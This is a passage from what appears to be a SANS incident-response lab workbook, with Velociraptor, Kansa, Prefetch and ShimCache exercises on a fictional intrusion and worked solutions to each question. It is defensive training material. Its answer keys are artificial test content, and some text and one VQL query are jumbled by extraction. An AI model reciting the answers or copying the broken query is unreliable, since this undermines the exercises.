We can use count() AS Count along with GROUP BY and ORDER BY as we did in prior analyses to ﬁnd the outliers (the
unsigned processes occurring least frequently). How would you do that in this case to stack by occurrences of the Exe ﬁeld?
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

70

© 2023 SANS Institute

.

Solution
Try the following VQL (new/changed lines highlighted yellow):
/*
# Windows.System.Pslist
*/

SELECT Name,Exe,CommandLine,Hash.SHA1 AS SHA1,Authenticode.Trusted,Username,Fqdn,count()
AS Count FROM source()
WHERE Authenticode.Trusted =~ 'untrusted

GROUP BY Exe
ORDER By Count

.

LIMIT 50

3. That's not too bad. You should see 16 results returned. However, it's still fairly noisy. Unfortunately, what adds a lot of noise
are the Windows Apps (aka Windows "Modern Apps" or "Metro Apps"). The unfortunate part is they are actually signed, but
use per-application catalog ﬁles located with each app. These are currently not parsed/validated by Velociraptor. Well, some
Windows Apps are validated by Velociraptor, but not all.

© 2023 SANS Institute

.

71

Digging deeper into Windows App signatures
This inability to verify Windows App digital signatures turns out to be a problem even for Windows. For example, open a
new CMD window and use sigcheck.exe from Microsoft Sysinternals to check the digital signature of a traditional
Windows app (cmd.exe) versus a newer style Windows packaged app (CalculaterApp.exe):
sigcheck C:\windows\system32\cmd.exe

Expected results

G:\>sigcheck C:\windows\system32\cmd.exe
Sigcheck v2.82 - File version and signature viewer
Copyright (C) 2004-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
c:\windows\system32\cmd.exe:

Verified:
Signing date:
Publisher:
Company:
Description:
Product:
Prod version:
File version:
MachineType:

Signed
6:02 AM 7/6/2022
Microsoft Windows
Microsoft Corporation
Windows Command Processor
Microsoft Windows Operating System
10.0.19041.746
10.0.19041.746 (WinBuild.160101.0800)
64-bit

Expected results

.

sigcheck "C:\Program
Files\WindowsApps\Microsoft.WindowsCalculator_11.2210.0.0_x64__8wekyb3d8bbwe\CalculatorApp.exe"

G:\>sigcheck "C:\Program
Files\WindowsApps\Microsoft.WindowsCalculator_11.2210.0.0_x64__8wekyb3d8bbwe\CalculatorApp.exe"
Sigcheck v2.82 - File version and signature viewer
Copyright (C) 2004-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
c:\program
files\windowsapps\microsoft.windowscalculator_11.2210.0.0_x64__8wekyb3d8bbwe\CalculatorApp.exe:

Verified:
Link date:
Publisher:
Company:
Description:
Product:
Prod version:
File version:
MachineType:

72

Unsigned
5:37 PM 11/7/2022
n/a
Microsoft Corporation
Calculator
Microsoft Calculator
11.2210.0.0
11.2210.0.0
64-bit

© 2023 SANS Institute

.

From the results, notice that cmd.exe is veriﬁed as signed, whereas CalculatorApp.exe is not. It is actually signed,
however, and can be validated via the per-app catalog ﬁle. In the case of the CalculatorApp, the catalog ﬁle should be
located at C:\Program
Files\WindowsApps\Microsoft.WindowsCalculator_11.2210.0.0_x64__8wekyb3d8bbwe\AppxMetadata\CodeIntegrity.cat .

But a lot of tools currently miss this, including Windows File Explorer, as demonstrated in the following tweet from
SwiftOnSecurity: https://twitter.com/swiftonsecurity/status/1660121646428979201.

Since this version of Velociraptor is unable to verify all of the Windows Apps, we'll take a shortcut and ﬁlter them out. This can
be done with another ﬁlter on the existing WHERE statement. Speciﬁcally, add an AND NOT to specify criteria to remove.
Can you craft the VQL to ﬁlter out the "WindowsApps" processes?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
Try adding AND NOT Exe =~ 'WindowsApps' to the end of the existing WHERE statement:
/*
# Windows.System.Pslist
*/
SELECT Name,Exe,CommandLine,Hash.SHA1 AS SHA1,Authenticode.Trusted,Username,Fqdn,count() AS Count FROM
source()
GROUP BY Exe
ORDER By Count
LIMIT 50

.

WHERE Authenticode.Trusted =~ 'untrusted' AND NOT Exe =~ 'WindowsApps'

Which processes occur just once or twice and therefore may require follow-up?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

73

Solution
There are 4 processes that are clear outliers in this stack analysis, occurring just one or two times:

Two of the processes we could eliminate with some knowledge of the SRL network. The other 2 are unknown.
• C:\Windows\System32\STUN.exe on RD01 is suspicious because it's unknown to the organization and it's an unsigned
our malware persistence lab.)

.

executable in the attacker-coveted C:\Windows\System32 directory. (Note that we previously ﬂagged this one during

• C:\Windows\Services\ServiceUpdate.exe on DEV01 is suspicious because it's unknown to the organization and it's
an unsigned executable in a subdirectory of C:\Windows .
• C:\ELASTI~1\modules\X-PACK~2\platform\WINDOW~1\bin\CONTRO~1.EXE on SQL01 certainly looks unusual, but it turns
out to be related to a proof-of-concept instance of Elasticsearch running on a database server. After a quick
investigation, this can be ruled out as a false positive.
• C:\Program Files\nxlog\nxlog.exe was found running on FTP01 and another host. The Count column shows that
it was running twice. How could you update the VQL to determine which two hosts were running nxlog.exe ?
________________________________________________________________
________________________________________________________________

74

© 2023 SANS Institute

.

Solution
There are numerous ways to do this. Here's one simple option:
/*
# Windows.System.Pslist
*/
SELECT Fqdn FROM source()
WHERE Exe =~ 'nxlog.exe'

The results show ELF01 (the Windows Event Log Forwarding server) and FTP01 (the DMZ Windows FTP server).
These two hosts are systems that SRL forwards logs from using the NxLog tool, so this is legitimate and can be
ignored.
Threat Hunt Results
• Execution: Successful

.

• Conclusion: Suspicious activity detected - requires follow-up on RD01 and DEV01
• Comments: Unknown and unsigned processes running from within the protected C:\Windows directory on RD01 and
DEV01 require investigation.

Hunting for Suspicious Signatures
As mentioned earlier, we generally prefer not to trust all signed code. However, it's a reasonable ﬁrst pass to ﬁlter out signed code
and look for outliers among the unsigned. However, let's now turn our attention to the signed binaries. In order to start looking for
outliers within signed binaries, there are a few approaches we could take. The following is just one such option.
1. Stack the signed executables and investigate any with low count. An Authenticode subﬁeld we could group by and count is
IssuerName . Try the following VQL in the Windows.System.Pslist hunt notebook:
/*
# Windows.System.Pslist
*/
SELECT Authenticode.Trusted,Authenticode.IssuerName,count() AS Count FROM source()
GROUP BY Authenticode.IssuerName
ORDER BY Count

© 2023 SANS Institute

.

75

The result should show a set of outliers showing up 3 times or less:

2. Following up on a small set of outliers could be worthwhile. As to how you track the speciﬁc executables and the systems
they ran on, a WHERE ﬁlter on the Authenticode.IssuerName should work. For example, here's a query to get the details on the
ﬁrst issuer in the list:

.

/*
# Windows.System.Pslist
*/
SELECT * FROM source()
WHERE Authenticode.IssuerName =~'C=US, O=DigiCert, Inc., CN=DigiCert Global G3 Code Signing ECC SHA384 2021
CA1'

In this example, it turned out to be Foxit PDF Reader. This is a legitimate alternative to Adobe Acrobat Reader.

76

© 2023 SANS Institute

.

You could continue to do this for the handful of remaining outliers. To save you a little time, none of the remaining outliers (3
or fewer) were associated with malicious code. They were known processes, such as Kibana, Elasticsearch, and a couple of
tools related to the incident response efforts (F-Response and USB over Ethernet). Nevertheless, this should serve as another
good example of the power of hunting and analyzing with Velociraptor.
There are several more hunts to explore in Velociraptor, with at least two more artifacts relevant to the case to uncover! A little
hint/tip though: one of those artifacts is in the Windows.Systinernals.Autoruns hunt. Unfortunately though, it's a little hard to
ﬁnd because the default Autoruns artifact does not enable digital signature validation. So one of our best methods for data
reduction is not available in that hunt. Fortunately, Clint Barton also ran Kansa during the response, and Kansa does have

.

signature validation enabled on the Autoruns sweep. We'll take advantage of that in the next Optional Homework section.

© 2023 SANS Institute

.

77

Note
You can easily update/customize existing artifacts such as Windows.Systinernals.Autoruns by ﬁnding them in the View
Artifacts page, clicking the "Pencil" button to edit it (this will create a copy for you to edit, because you can't change a default
artifact), and then ﬁnd and change what you need to. For example, in this section of the
-s to verify signatures:

hi

de

01

.ir

artifact, you would add another command-line parameter

Windows.Systinernals.Autoruns

Optional Homework: Threat Hunting with the Kansa PowerShell Framework
Stark Research Labs' IT security analyst Clint Barton ran Kansa against the environment during the response. We will look at
some of this collected data to try to locate anomalies. In particular, we will focus on the data collected from the workstations in
the R&D network (naming convention of rdXX) and the line of business network (naming convention of wkstnXX). These
workstations are a relatively consistent build and therefore allow for effective stacking (outlier) analysis.
When running Kansa to collect data, the

-Analysis option can be provided to automatically generate analysis ﬁles following the

collection from remote hosts. However, if the -Analysis option is not used at collection time, the analysis scripts can still be used
after-the-fact by manually running the scripts in the directory that contains the previously collected data. For this optional part of
the lab, we will have you generate one of the analysis ﬁles manually. You can also review the precooked output from most of the
analysis scripts at G:\SRL_Evidence\kansa\kansa-post-intrusion\Analysis\AnalysisReports in the Windows VM.

Note
The Kansa scripts executed in Stark Research Labs were close to the defaults available at the Kansa GitHub repo, but there
were a small number of customizations. The exact set of scripts and ﬁles used in SRL are available in the Windows VM in
\SRL_Evidence\kansa\kansa-srl-custom .

78

© 2023 SANS Institute

.

G:

Stacking Autoruns Data
There was a lot of data collected via Kansa, but we're just going to focus on the Autoruns data in this optional lab. Fortunately,
Autoruns was run with the option to validate digital signatures. In fact, Kansa even includes a stacking script to look for outliers
based on unsigned autostart processes.

.

Begin by browsing to G:\SRL_Evidence\kansa\kansa-post-intrusion\Analysis\Autoruns-workstations directory in File Explorer.

Notice we have copied the workstation Autoruns CSV ﬁles into this folder. We also added a copy of the GetASEPImagePathLaunchStringMD5UnsignedStack.ps1

analysis script to this directory.

Right-click on the Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 script and choose "Edit with Notepad++"

© 2023 SANS Institute

.

79

Review this analysis script. Per the comments at the top, notice the function is to "Pull frequency of autoruns based on ImagePath,
LaunchString and MD5 tuple where the publisher is not veriﬁed (unsigned code) and the ImagePath is not 'File not found'". Notice the
script accomplishes frequency analysis by running Get-Command logparser.exe with SQL statements to ﬁlter out signed
executables and stack the remaining items based on the frequency of occurrence (i.e., count). Also, notice the FROM statement

.ir

tells logparser.exe to process data from any ( * ) ﬁles ending in autorunsc.csv. Overall, the script is quite simple and easy to

hi

de

01

customize. Most of the Kansa analysis scripts are similarly designed.

80

© 2023 SANS Institute

.

Now we need to open a PowerShell window at this directory location to run the script against all the workstations' Autoruns data.
Type powershell.exe into the address bar of File Explorer and press Enter:

You should then have a PowerShell window appear in the same path as Windows File Explorer (i.e.,

G:

\SRL_Evidence\kansa\kansa-post-intrusion\Analysis\Autoruns-workstations ):

Run the analysis script against the data in the Autoruns-workstations directory and redirect the output to a CSV ﬁle named

asep-

.

workstation-stack.csv , as follows:
.\Get-ASEPImagePathLaunchStringMD5UnsignedStack.ps1 > asep-workstation-stack.csv

Open the resulting asep-workstation-stack.csv ﬁle in G:\SRL_Evidence\kansa\kansa-post-intrusion\Analysis\Autorunsworkstations with Timeline Explorer:

© 2023 SANS Institute

.

81

.

Timeline Explorer should look similar to the following. Note that the ct column header stands for "Count".

You are ready to begin the analysis by answering the following questions.
1. Which processes/scripts are found on only one (1) of the workstations (i.e., which are true outliers)?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

82

© 2023 SANS Institute

.

Solution
• c:\windows\update\narrator.exe
• c:\windows\update\gadget.js
• c:\windows\system32\stun.exe
• c:\program files\npcap\checkstatus.bat
2. Which systems were these processes found on? (Hint: A simple way to search is to use PowerShell's Select-String cmdlet
(i.e., Select-String "<filename>" *Autorunsc.csv ).
________________________________________________________________
________________________________________________________________
________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

83

Solution
• c:\windows\update\narrator.exe on WKSTN05
• c:\windows\update\gadget.js on RD08
• c:\windows\system32\stun.exe 0n RD01
• c:\program files\npcap\checkstatus.bat on ADMIN01
Here's an example search for narrator.exe :
Select-String "narrator.exe" *Autorunsc.csv

Notice the hostname can be identiﬁed both from the name of the CSV ﬁle, as well as the matched lines within the ﬁle. In
this case, there was just one match for narrator.exe , from host wkstn05 . We are reading CSV formatted data, which can
be a little challenging, but with practice you will quickly be able to pick out the items of interest.
Similarly, running the following commands will reveal the hosts with the other 3 outlier processes ( Select-String is caseinsensitive by default):

.

Select-String "gadget.js" *Autorunsc.csv

Select-String "stun.exe" *Autorunsc.csv

Select-String "checkstatus.bat" *Autorunsc.csv

Lab Takeaways
In the main part of the lab, we analyzed Velociraptor hunt data to discover two systems potentially compromised with a DLL
persistence attack:
• RD08: C:\Users\slevine\AppData\Local\Microsoft\OneDrive\version.dll
• RD04: C:\Users\nromanoff\AppData\Local\slack\CRYPTBASE.dll
We also identiﬁed a rogue WMI CommandLine Event Consumer:
• WKSTN05: Event Consumer named "Narrator" conﬁgured to launch

C:\Windows\Update\narrator.exe

Being able to quickly and effectively sweep for indicators of compromise is absolutely critical to effective incident response and
threat hunting. We are fortunate that there are many more endpoint visibility tools available today than just a few years ago. Even

84

© 2023 SANS Institute

.

more fortunate is the fact that we have several free options, such as Velociraptor, that can rival many commercial tools. Even if
you have a solid endpoint analysis tool deployed in your organization, it's worth knowing about the sweeping and deep-dive

.

forensics capabilities of the freely available Velociraptor.

© 2023 SANS Institute

.

85

Lab 2.1: Evidence of Execution: Prefetch, ShimCache and Amcache
Objectives
1. Extract a quick view of application execution from

C:\Windows\Prefetch

2. Examine parsed output from individual prefetch ﬁles to identify:
• Execution path
• First and previous times of execution
• Files and folders interacted with by the executable (including ﬁles no longer present)
3. Investigate output from ShimCache SYSTEM Registry hive extraction
4. Understand how to use the "Last Modiﬁcation" time present in ShimCache data
5. Use the Amcache database to audit drivers and check ﬁle hashes
6. Employ stacking analysis techniques to scale analysis of execution artifacts collected from many systems

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics

.

2. Many of the upcoming exercises within the 508 Windows VM will take advantage of data present in a previously created
KAPE triage image of the RD01 system. As you will see, the VHDX output format from KAPE is portable and very easy to work
with.
• Use Windows Explorer to browse to G:\SRL_Evidence\triage and double-click on the ﬁle rd01-triage.vhdx . The image
will automatically mount in your 508 Windows VM using the next available drive letter (likely E: ).
• If your image does not mount as drive letter E: , you likely have another device (often USB or another triage image)
attached to your virtual machine. Consider ﬁxing this, rebooting, and trying again. The labs in this course will assume
this triage image is mounted as E: .
3. Before moving forward, please ensure your evidence is mounted correctly at rd01-triage(E:)

86

© 2023 SANS Institute

.

Lab Questions
Prefetch Analysis
1. Prefetch provides an easy way to audit applications executed on a system. Perform a quick review the contents of the E:
\C\Windows\prefetch\ folder using File Explorer. Given your level of experience, you might ﬁnd many applications which

could be relevant to a computer intrusion investigation. Document a few which you might prioritize digging deeper into.
________________________________________________________________

.

________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

87

Solution
There are no correct answers here, but here are a few examples of applications which could be relevant to a computer
intrusion investigation:
• CMD.EXE
• POWERSHELL.EXE
• QUSER.EXE
• REGEDIT.EXE
• NET.EXE and NET1.EXE
• SCHTASKS.EXE
• RUNDLL32.EXE
• RDPCLIP.EXE
• MSTSC.EXE
Let's begin examining the embedded metadata within these interesting prefetch ﬁles. Open an administrator command

.

terminal to execute the pecmd.exe parsing tool. Plan to leave this command terminal open for the duration of the lab.

Parse the prefetch ﬁle for POWERSHELL.EXE :
cd /d E:\C\Windows\prefetch
pecmd -f POWERSHELL.EXE-59FC8F3D.pf

Note
When running command-line tools as we are doing here, take advantage of <TAB>-complete to ﬁnish ﬁle names and
paths. It is much easier than typing out full names, such as the prefetch ﬁle names and hash values. To do so, start typing
the path or ﬁlename and simply hit <TAB> to ﬁnish out the unique parts of the ﬁle or path. Of course copy and paste also
works nicely here, but outside of these scripted labs, <TAB>-complete will make command-line operations much easier!

2. How many times was POWERSHELL.EXE executed on this system?
________________________________________________________________

88

© 2023 SANS Institute

.

Solution
Run count: 16

3. When was the ﬁrst time POWERSHELL.EXE was executed?
________________________________________________________________
Solution
2023-01-17 14:43:54 (approximately)
This is a tricky question! You might have been tempted to use the embedded "run times" stored within the prefetch ﬁle.
However, only up to eight times are stored and this application has been run sixteen times. Recall that the creation

.

timestamp for .pf ﬁles is the ﬁrst time we know that application was executed. So the "Created on:" value found within
the pecmd output would be the correct value to use here. But that isn't all! Also recall that .pf ﬁles are only written at
approximately ten seconds after execution, so you will need to subtract ten seconds from the "Created on:" value. We
labeled this timestamp as "approximately" since testing indicates it isn't always exactly ten seconds. As an example,
deviations in the "minus ten seconds" rule can occur when an application completes execution in less than ten seconds.

© 2023 SANS Institute

.

89

4. When was the last time

POWERSHELL.EXE

was executed?

________________________________________________________________
Solution
Last run: 2023-01-25 14:57:21
To answer this question we can use the "Last run" embedded timestamp. Note that you do not need to subtract anything
from the embedded "run times" as they are recorded at the time of execution. Alternatively, you could have also used the
.pf ﬁle modiﬁcation time, but in

this example it would have been less accurate because it looks like the "Modiﬁed on"

time is only -1 seconds off from the more accurate embedded "Last run" time. This could be due to a PowerShell
command completing execution within about one second. This is why we always say "approximately -10 seconds" when
referring to those Prefetch ﬁle system timestamps!
Note: While we are only documenting ﬁrst and last times executed here, if this application ends up being relevant to our
investigation, the "Other run times" would all also be relevant and could help identify additional time periods of attacker

.

activity on which to focus.

5. Advanced: Can we determine which user account executed POWERSHELL.EXE on this system?
________________________________________________________________
________________________________________________________________

Hint 1
Files referenced within user proﬁles can give at least some indication.
Hint 2
A special feature of PowerShell logging can give more deﬁnitive information about user account activity.

90

© 2023 SANS Institute

.

Command-Line

pecmd -f POWERSHELL.EXE-59FC8F3D.pf | findstr /I transcript

Solution
• Prefetch ﬁles are not tied to user accounts and usually only tell us that something executed, not which user executed
it. However, in some circumstances the ﬁles and folders referenced by the application can provide more detailed
information. Looking through this data source within our PowerShell prefetch ﬁle you can see ﬁles accessed from
multiple user proﬁles. This can be an indication that the user account was logged in during application execution. In
this case we can do even better because it appears that PowerShell Transcript logging was enabled on this system.
We will cover this in much more detail later in the course, but this type of logging will record PowerShell console
activity within the Documents folder of the user executing PowerShell.
• In this example, user accounts TDUNGAN and WACSVC had PowerShell transcripts recording their activities.

6. Perform a similar analysis on the prefetch ﬁle for CMD.EXE . How many total times has it been executed on the system and
when was it last executed?

.

pecmd -f CMD.EXE-89305D47.pf

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

91

Solution
• Run count: 49
• Last run: 2023-01-25 15:07:50
• Notice that the last run time is quite close to the last run time for PowerShell on the system and the other run times
indicate CMD.EXE was executed multiple times on 2023-01-25.

7. Review the directories and ﬁles referenced within the CMD.EXE .pf ﬁle. Recall these are items touched by the application within
ten seconds of execution. What items present give insight into how CMD.EXE has been used?
________________________________________________________________
________________________________________________________________

.

________________________________________________________________
________________________________________________________________

92

© 2023 SANS Institute

.

Solution
Several executables of interest are stored within this .pf ﬁle. This information tells us that CMD.EXE interacted with (and
likely was used to execute) NET.EXE, CSCRIPT.EXE, WHERE.EXE, SHUTDOWN.EXE, and WERFAULT.EXE. Keep in mind that
.pf ﬁles do not store absolute historical information, so it is possible there were even more executables present in previous

.

versions of this .pf ﬁle.

• C hallenge: Can you ﬁnd an indicator of compromise in this data?
Hint
Is there a ﬁle present in an unexpected location?

© 2023 SANS Institute

.

93

Solution
• This could be easy to miss, but WERFAULT.EXE is not present in an expected location. If you look at a baseline
system you will discover the expected location for this binary to be in C:\Windows\System32 and C:
\Windows\SysWOW64.
• Windows\Update is not a default folder in Windows and could be an indication of a location used to store
malware. If so, the attackers are clearly attempting to blend in and hide in plain sight. Everything we learn about
the attacker's tradecraft makes it easier to track them elsewhere in the network.
• You might have also noticed the ZONE.IDENTIFIER alternate data stream attached to WERFAULT.EXE. We will dive
into these artifacts later in class, but they indicate the ﬁle was downloaded from the Internet using a browser, email
client, or chat client. It would be highly unusual for a legitimate Windows tool to have this "mark of the web"
attached. This also provides insight into attacker tradecraft, indicating some of their tools might be directly
downloaded to the target system.

Automating Prefetch Parsing
A common way to conduct prefetch analysis is to parse the entire Prefetch folder, outputting information into a .CSV ﬁle or
database for more scalable review.

.

Use the following command to extract data from all prefetch ﬁles in the C:\Windows\Prefetch folder into a .CSV ﬁle:
pecmd -d E:\C\Windows\prefetch -q --csv g:\Labs\execution --csvf rd01-prefetch.csv

Two ﬁles will be written into the G:\Labs\execution folder. Open each ﬁle in Timeline Explorer for review.
• rd01-prefetch.csv
• rd01-prefetch_Timeline.csv

94

© 2023 SANS Institute

.

1. We previously identiﬁed a suspicious executable located in the Windows\Update folder. Perform a search for the keyword
"Windows\Update" in the Timeline Explorer ﬁlter bar in ﬁle rd01-prefetch.csv. What executables have hits for this folder within
their prefetch ﬁles?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• CMD.EXE

• EXCEL.EXE

.

• EDGEUPDATER.EXE

• NOTEPAD.EXE
• POWERSHELL.EXE

© 2023 SANS Institute

.

95

2. Scan the columns in rd01-prefetch.csv looking for items highlighted due to your previous ﬁlter. You will notice the column
Files Loaded contains hits for each of the prefetch ﬁles identiﬁed.

• Double-click on the Files Loaded cell corresponding to NOTEPAD.EXE-C8A0647D.pf. Perform a quick review, recognizing it

.

is a lot of data to get through.

• Return back to the command terminal used previously and run the following command to ﬁlter output from NOTEPAD.EXEC8A0647D.pf for the keyword "update". Document any items which could be relevant to our investigation.
pecmd -f NOTEPAD.EXE-C8A0647D.pf | findstr /I "update"

________________________________________________________________
________________________________________________________________
________________________________________________________________

96

© 2023 SANS Institute

.

Solution
• \WINDOWS\UPDATE\DEV01.SHIELDBASE.COM.TXT
• \WINDOWS\UPDATE\DC01.SHIELDBASE.COM.TXT
• \WINDOWS\UPDATE\DATA.BAT
• These ﬁles were likely opened using the Notepad application.

3. Repeat the previous command to extract any items of interest for the other prefetch ﬁles containing references to
"Windows\Update": EDGEUPDATER.EXE, EXCEL.EXE, and POWERSHELL.EXE
• EDGEUPDATER.EXE-39C2713A.pf
Solution
• \WINDOWS\UPDATE\RD02\DOCUMENTS
• \WINDOWS\UPDATE\RD03\DOCUMENTS
• \WINDOWS\UPDATE\RD04\DOCUMENTS
• \WINDOWS\UPDATE\RD04\DOCUMENTS\PROJECTS
• \WINDOWS\UPDATE\SRL-EYES-ONLY

.

• \WINDOWS\UPDATE\EDGEUPDATER.EXE
• \WINDOWS\UPDATE\EDGEUPDATER.CFG
• \WINDOWS\UPDATE\RD09-HISTORY.CSV
• \WINDOWS\UPDATE\RD03-HISTORY.CSV
• \WINDOWS\UPDATE\RD02-HISTORY.CSV
• \WINDOWS\UPDATE\RD04-HISTORY.CSV
• EXCEL.EXE-8E67AA2B.pf
Solution
• \WINDOWS\UPDATE\RD09-HISTORY.CSV
• \WINDOWS\UPDATE\RD04-HISTORY.CSV
• POWERSHELL.EXE-59FC8F3D.pf

© 2023 SANS Institute

.

97

Solution
• \WINDOWS\UPDATE\DC01.SHIELDBASE.COM.TXT
4. What stages of the attack lifecycle are illustrated by the ﬁndings from the previous question?
________________________________________________________________
________________________________________________________________
Solution
The ﬁle and folder names found to be present in the Windows\Update folder should make you even more conﬁdent this
folder could be related to nefarious activity.
• EDGEUPDATER.EXE and EDGEUPDATER.CFG seem to indicate tool and/or exploit staging in the Update folder.
• Folder names referencing other SRL workstation names (e.g. \WINDOWS\UPDATE\RD02\DOCUMENTS) seem to
indicate lateral movement and/or targeting of those systems.
• File names like \WINDOWS\UPDATE\RD09-HISTORY.CSV and \WINDOWS\UPDATE\DEV01.SHIELDBASE.COM.TXT
could indicate successful access and collection from those systems.
• Folder names like PROJECTS and SRL-EYES-ONLY seem to indicate data theft and potential data exﬁltration.
We are making educated guesses here, but if true, this provides an immense amount of information on attacker activities
and tradecraft very early in our investigation. A next logical step would be to attempt to recover those ﬁles for further
analysis to see if our hypothesis is supported. If you attempt to do this, you will ﬁnd they are unfortunately no longer
present on the ﬁlesystem (making this prefetch data all that more valuable).
5. O ptional homework: We previously identiﬁed a reference to the executable WHERE.EXE in the CMD.EXE-89305D47.pf ﬁle. This

.

is a somewhat unusual built-in Windows command that can be abused to search systems for ﬁles of interest. From an
attacker's perspective, it would likely be executed during system reconnaissance activities. Let's demonstrate the technique of
using one piece of information to (hopefully) identify other related activity.

a. Switch to the ﬁle rd01-prefetch_Timeline.csv in Timeline Explorer
b. Sort the timeline by the Run Time column to put all of the data in chronological order
c. Create a ﬁlter for "WHERE.EXE" to identify where it is present in the timeline
d. Click on one of the results to anchor the timeline on that location
e. Clear your ﬁlter to see the results surrounding your hit. The timeline should remain on the line you selected while
providing context of other items nearby your selection

98

© 2023 SANS Institute

.

.

• What other commands do you see nearby WHERE.EXE that could be used for system reconnaissance?

© 2023 SANS Institute

.

99

Solution
There are several built-in Windows tools near WHERE.EXE in the timeline that could be used for recon efforts:
• SYSTEMINFO.EXE
• TASKLIST.EXE
• IPCONFIG.EXE
• NETSTAT.EXE
• NET1.EXE AND NET.EXE

.

• QUSER.EXE

• What is the time range of the likely recon activity on the system?
Solution
The execution time range for the binaries listed above is quite short: 2023-01-16 22:52:14 to 2023-01-16 22:55:14
(about 3 minutes in total)
• Advanced: Do you see any executables running nearby these tools which could indicate how the attackers accessed the
system?

100

© 2023 SANS Institute

.

Solution
WSMPROVHOST.EXE is the process that executes on a system when it is the target of a PowerShell remoting request.
In this example, notice it executes at the exact time of SYSTEMINFO.EXE, indicating they could be related. We would
not expect most students to know this bit of trivia this early in the course and will be covering the topic in much more
detail later.
ShimCache Examination
The Application Compatibility Cache, also known as ShimCache, is a relatively simple forensic artifact which can provide outsized
gains for investigators searching for attacker tools and techniques. In a command terminal, run the

appcompatcacheparser.exe

tool to parse the database and identify executables present on the system.
• Run the following command in an administrator command terminal:
appcompatcacheparser -f E:\C\Windows\system32\config\SYSTEM --csv G:\Labs\execution --csvf
appcompatcache.csv

.

The output should look similar to the following. If you get errors, ensure your triage image is mounted correctly at rd01-triage(E:).

Once completed, the output ﬁle will be available in the G:\Labs\execution folder. Open the ﬁle appcompatcache.csv in Timeline
Explorer for review.
1. How many total entries are present in appcompatcache.csv?
________________________________________________________________

© 2023 SANS Institute

.

101

Solution
• There are 1024 entries in the ShimCache database for rd01. This is the maximum number of entries typically
available.
2. What does the Last Modiﬁed Time column indicate?
________________________________________________________________
Solution
The Last Modiﬁed Time reported in ShimCache is derived from a ﬁle system timestamp. It is very simply the LAST
MODIFICATION time of the executable ﬁle. Many new examiners who are working with ShimCache entries mistake this
timestamp as the actual time of execution. ShimCache does not track execution time for Win7+ systems.
ShimCache does exhibit some interesting behavior which can make these timestamps more useful: if an executable is
moved, modiﬁed (content is changed) or renamed, it will be shimmed again, and a new entry will be created for the same
ﬁle. Thus a rename pattern in this artifact looks like multiple entries with the exact same last modiﬁcation date and
location, but different names. This is not deﬁnitive proof, but it is a good indication of rename activity. A more deﬁnitive
alternative to identify ﬁle renaming can be accomplished by examining the NTFS change log (UsnJrnl), and ﬁlesystem
journal (Logﬁle), which we will do later in the class.
3. Similar to the process followed during prefetch examinations, we will start by ﬁltering for things we know or suspect, such as
indicators of compromise or common attack techniques, with the hope they can place us in the right location to discover more
about the activity. Finding one hit can lead us to other hits. Filter the output for windows\update . What new information about
that folder can we derive from ShimCache?
________________________________________________________________

.

________________________________________________________________
Solution
c:\windows\update\svchost.exe and C:\Windows\Update\rd01\EdgeUpdater.exe were not previously identiﬁed during the
examination of Prefetch

102

© 2023 SANS Institute

.

4. In the previous output, can we determine if the two EdgeUpdater.exe ﬁles are the same?
________________________________________________________________
Solution
With matching ﬁle names and identical Last Modiﬁed times, there is a good chance the two ﬁles are the same. However,
we are not provided enough information to be 100% sure. We would need to recover these ﬁles or ﬁnd references to them
in the Amcache.hve database so we could use ﬁle hash values to be deﬁnitive.

5. Now ﬁlter for EdgeUpdater to see if there are any other instances present in ShimCache. What important piece of information
can you derive from the results?
________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

103

Solution
This is a big win! The artifacts we are working with so far in the class do not provide much insight into speciﬁc user
account activity, but sometimes this can be derived. Finding C:\Users\wacsvc\Downloads\EdgeUpdater.exe tells us it is
likely the wacsvc account is related to suspicious activity on this system. The Downloads folder indicates the executable
could have been downloaded via a web browser, which means we should put browser forensics on our to-do list.
Bonus: Take a look at the Cache Entry Position column for these hits. While we do not have execution times in ShimCache,
items are kept in the order they were added to the database, with items at the top (smaller Cache Entry Position values)
being more recently added. Using this information, one hypothesis is that EdgeUpdater.exe was downloaded using the
wacsvc account, then subsequently moved to C:\Windows\Update and then moved again to C:\Windows\Update\rd01.
You can see how a lot of attacker activity can "leak" into this database!

6. Continuing to dig deeper into this new information, create a ﬁlter for wacsvc. What new ﬁle should we add to our list of
indicators? What additional information can you derive about this ﬁle?

.

________________________________________________________________
________________________________________________________________

104

© 2023 SANS Institute

.

Solution
• C:\Users\wacsvc\Downloads\bhv.exe is an unusual ﬁlename and appears to be related to other ﬁndings by its
presence within the same folder as another item of interest.
• A comparison of the Last Modiﬁed times indicates EdgeUpdater.exe could be a renamed version of bhv.exe (both ﬁles
have the same location and Last Modiﬁed times).
• A review of the Cache Entry Position values for the two ﬁles shows bhv.exe was recorded earlier on the system, which
could indicate it is the original ﬁle name of the tool we are tracking.

7. Clear any ﬁlters and review the complete ShimCache contents for any evidence of lateral movement. What evidence can you
ﬁnd indicating connections to other systems on the network?
Hint
If you are looking below Cache Entry Position 200, you are too far down the list.

.

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

105

Solution
• \\172.16.6.19\c$\Users\srogers\
• \\172.16.6.14\c$\Users\nromanoff\
• This output is fascinating for many reasons. There is no reason for ShimCache to be tracking executables on systems
other than the current machine. However, if a user views the contents of another system and that folder contains
executable ﬁles, it is common for those "remote" ﬁles to also be recorded within ShimCache. This most commonly
occurs when a share has been mapped to a system and the user views that share via something like Windows File
Explorer. In this case, it looks like the "C$" share was mapped on 172.16.6.19 and 172.16.6.14 and the contents of two
user proﬁles were viewed. The mapping of "C$" (commonly called an admin share) is a classic lateral movement
technique and one we will spend more time exploring a little later in the course. This is an important ﬁnding because it
shows new attacker tradecraft and identiﬁes two additional systems which need to be investigated (don't forget to

